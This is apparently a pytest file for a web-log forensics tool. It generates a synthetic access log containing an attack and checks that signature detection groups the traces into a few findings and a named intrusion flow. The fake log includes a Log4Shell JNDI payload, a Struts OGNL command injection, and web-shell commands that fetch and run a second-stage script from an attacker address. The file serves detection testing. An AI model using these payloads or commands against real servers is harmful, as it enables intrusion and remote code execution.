"""Signature pack end to end: an attack recorded in a web log becomes a short list of findings and a named flow."""
from __future__ import annotations

from datetime import datetime, timedelta

from saw.devtools.sample_data import KST, _line, scenario_weblog
from tests.api.test_phase5_bulk import upload

ATTACKER, SCANNER, SERVER_UA = "203.0.113.50", "198.51.100.77", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0"


def attack_log() -> bytes:
    """Normal traffic, an internet scanner that only gets refusals, and one attacker: probing with a tool, a published
    exploit, a web shell that answers, and a command that fetches a second stage."""
    t0 = datetime(2026, 10, 5, 3, 0, tzinfo=KST)
    out = list(scenario_weblog(normal=200, enum_count=0))
    n = 0

    def add(ip, method, uri, status, ua, gap=2):
        nonlocal n
        n += gap
        out.append(_line(ip, t0 + timedelta(seconds=n), method, uri, status, 512, ua))

    for path in ("/.git/config", "/.env", "/actuator/env", "/phpmyadmin/", "/manager/html", "/wp-login.php", "/solr/admin/cores"):
        add(SCANNER, "GET", path, 404, "Mozilla/5.0 zgrab/0.x")
    for path in ("/admin/", "/.git/config", "/WEB-INF/web.xml", "/phpinfo.php", "/server-status"):
        add(ATTACKER, "GET", path, 404, "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000123)")
    add(ATTACKER, "GET", "/?x=${jndi:ldap://203.0.113.50:1389/a}", 404, SERVER_UA, gap=60)
    add(ATTACKER, "GET", "/index.action?redirect:%24%7B%23a%3D(new%20java.lang.ProcessBuilder(%22id%22)).start()%7D", 500, SERVER_UA)
    add(ATTACKER, "POST", "/se2/sample/photo_uploader/file_uploader_html5.php", 200, SERVER_UA, gap=120)
    add(ATTACKER, "GET", "/upload/2026/10/shell.php?cmd=whoami", 200, SERVER_UA, gap=30)
    add(ATTACKER, "GET", "/upload/2026/10/shell.php?cmd=wget+http://203.0.113.50/m.sh+-O+/tmp/m.sh", 200, SERVER_UA)
    add(ATTACKER, "GET", "/upload/2026/10/shell.php?cmd=chmod+%2Bx+/tmp/m.sh;/tmp/m.sh", 200, SERVER_UA)
    return ("\n".join(out) + "\n").encode()


def _run(api, title="시그니처"):
    inv = api.post("/investigations", json={"title": title}).json()
    up = upload(api, inv["id"], "access.log", attack_log())
    api.post(f"/evidence/{up['evidence_id']}/process")
    return inv, api.get(f"/investigations/{inv['id']}/findings").json()


def test_known_traces_become_few_findings_with_success_set_apart(analyst):
    inv, fs = _run(analyst)
    sig = [f for f in fs if f["detector"]["id"] == "sig.match"]
    by_cat = {}
    for f in sig:
        by_cat.setdefault(f["category"], []).append(f)
    # tools: scanner and Nikto are folded into one line each group, whatever number of requests they made
    assert len(by_cat["sig.tool"]) == 1 and "Nikto" in by_cat["sig.tool"][0]["explanation_md"]
    # refused probes of many kinds: one finding per group, not one per path
    refused = [f for f in by_cat["sig.exposure"] if "성공 응답 없음" in f["title"]]
    assert len(refused) == 1 and "종" in refused[0]["title"]
    leaked = [f for f in by_cat["sig.exposure"] if "성공 응답 있음" in f["title"]]     # the sample log serves /.env once
    assert all(f["risk_score"] > refused[0]["risk_score"] for f in leaked)
    assert len(by_cat["sig.console"]) == 1
    # what was answered with success stands alone and ranks above the refused attempts
    shell = [f for f in by_cat["sig.webshell"] if "성공 응답 있음" in f["title"]]
    assert shell and any(f["risk_level"] in ("high", "critical") for f in shell)
    assert all(f["risk_level"] != "info" for f in shell)
    execs = by_cat["sig.exec"]
    assert {f["title"].split(" — ")[0] for f in execs} >= {"외부에서 파일을 받아 실행 (wget·curl·certutil·bitsadmin)"}
    assert all("확인·대응 권고" in f["explanation_md"] for f in sig)
    rce = by_cat["sig.rce"]
    assert any("Log4Shell" in f["title"] or "Log4Shell" in f["explanation_md"] for f in rce)
    assert max(f["risk_score"] for f in shell + execs) > max(f["risk_score"] for f in refused + by_cat["sig.tool"])
    # the evidence query of a finding returns exactly the tagged requests
    one = shell[0]
    d = analyst.post(f"/investigations/{inv['id']}/findings/{one['id']}/events", json={"limit": 50}).json()
    assert d["total"] >= 1 and all("shell.php" in e["uri"] for e in d["events"])
    assert len(sig) <= 14, [f["title"] for f in sig]            # dozens of traces, a list an analyst can read


def test_findings_in_order_for_one_address_become_a_named_flow(analyst):
    inv, fs = _run(analyst, "흐름")
    flows = {f["category"]: f for f in fs if f["detector"]["id"] == "scenario.flow"}
    assert "scenario.web_intrusion" in flows, sorted(flows)
    f = flows["scenario.web_intrusion"]
    assert f"ip:{ATTACKER}" in f["entities"] and f"ip:{SCANNER}" not in f["entities"]   # the scanner never got past probing
    assert f["risk_level"] in ("high", "critical") and "①" in f["explanation_md"] and "③" in f["explanation_md"]
    assert f["title"].startswith("웹 서버 침투 흐름")
    assert "scenario.exec_after_exploit" in flows or "scenario.recon_then_success" in flows
    # a flow points at its steps, it does not swallow them
    linked = f["evidence_refs"]["query"]["finding_ids"]
    ids = {x["id"] for x in fs}
    assert len(linked) == 3 and set(linked) <= ids
    b = analyst.get(f"/investigations/{inv['id']}/briefing").json()
    assert any("웹 서버 침투 흐름" in t["what"] for t in b["top_findings"])


def test_a_signature_can_be_switched_off_for_this_site_and_back(analyst, senior):
    cat = analyst.get("/detection-catalog").json()
    assert len(cat["signatures"]) >= 150 and len(cat["scenarios"]) >= 8 and len(cat["detectors"]) >= 30
    assert cat["can_switch"] is False and senior.get("/detection-catalog").json()["can_switch"] is True
    sid = "webshell.generic_names"
    assert analyst.put(f"/detection-catalog/signatures/{sid}", json={"enabled": False, "note": "시끄러움"}).status_code == 403
    assert senior.put(f"/detection-catalog/signatures/{sid}", json={"enabled": False, "note": ""}).status_code == 400   # say why
    assert senior.put("/detection-catalog/signatures/nope.none", json={"enabled": False, "note": "없는 규칙"}).status_code == 404
    senior.put(f"/detection-catalog/signatures/{sid}", json={"enabled": False, "note": "우리 서비스의 정상 경로와 겹침"}).raise_for_status()
    row = next(x for x in analyst.get("/detection-catalog").json()["signatures"] if x["id"] == sid)
    assert row["enabled"] is False and row["updated_by"] == "senior1" and "겹침" in row["note"]
    inv, fs = _run(analyst, "끄기")
    assert not any(f["evidence_refs"]["query"]["filters"] == [{"field": "tags", "op": "is", "value": f"sig:{sid}"}] for f in fs)
    assert any("웹셸 조종에 쓰이는 값 이름" in f["title"] for f in fs)          # other web shell signatures still report
    # on again: the next analysis brings the finding back (events kept their tags)
    senior.put(f"/detection-catalog/signatures/{sid}", json={"enabled": True}).raise_for_status()
    analyst.post(f"/investigations/{inv['id']}/reanalyze")
    fs = analyst.get(f"/investigations/{inv['id']}/findings").json()
    assert any(f["title"].startswith("흔한 웹셸 파일 이름") for f in fs)
